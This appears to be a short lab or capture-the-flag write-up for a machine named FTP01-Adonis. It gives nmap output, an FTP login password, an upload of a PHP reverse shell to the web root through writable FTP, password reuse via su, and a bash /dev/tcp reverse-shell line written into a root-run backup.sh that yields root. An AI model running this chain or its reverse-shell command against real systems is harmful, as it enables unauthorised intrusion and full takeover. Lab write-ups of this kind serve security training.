## FTP 
```
ftp 10.10.110.12
Connected to 10.10.110.12.
220 (vsFTPd 3.0.5)
Name (10.10.110.12:p3ta): fred
```
Password: fr3dS_Str0ng_p@ss

## NMAP
```
nmap -sCV -p- -A -T4 10.10.110.12
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 10:17 PDT
Nmap scan report for 10.10.110.12
Host is up (0.076s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 192.168.1.12 is not the same as 10.10.110.12
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp    open     ssh           OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c094969e4260dbf63f570c852c92d441 (ECDSA)
|_  256 08302e7e0c1b9c422ccf5f845d50dcb3 (ED25519)
80/tcp    open     http          Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Cloud Explorer
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

I was able to navigate throughout the file system with FTP and I noticed that I could put a file. 
-create PHP RS
-Put it in the directory of the web server
-Execute the RS with NC listener active

```
nc -lvp 1234
listening on [any] 1234 ...
10.10.110.12: inverse host lookup failed: Unknown host
connect to [10.10.14.21] from (UNKNOWN) [10.10.110.12] 45410
Linux FTP01-Adonis 5.15.0-41-generic #44-Ubuntu SMP Wed Jun 22 14:20:53 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 10:32:24 up 31 days,  6:52,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

we can run su to change to fred
```
www-data@FTP01-Adonis:/$ su - fred
su - fred
Password: fr3dS_Str0ng_p@ss

fred@FTP01-Adonis:~$ 

```

in the FTP file there is a backup.sh file that we can edit

```
fred@FTP01-Adonis:/ftp$ echo "/bin/bash -c '/bin/sh -i >& /dev/tcp/10.10.14.21/4444 0>&1'" > /ftp/backup.sh
```
```
nc -lvp 4444
listening on [any] 4444 ...
10.10.110.12: inverse host lookup failed: Unknown host
connect to [10.10.14.21] from (UNKNOWN) [10.10.110.12] 33966
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# 
```

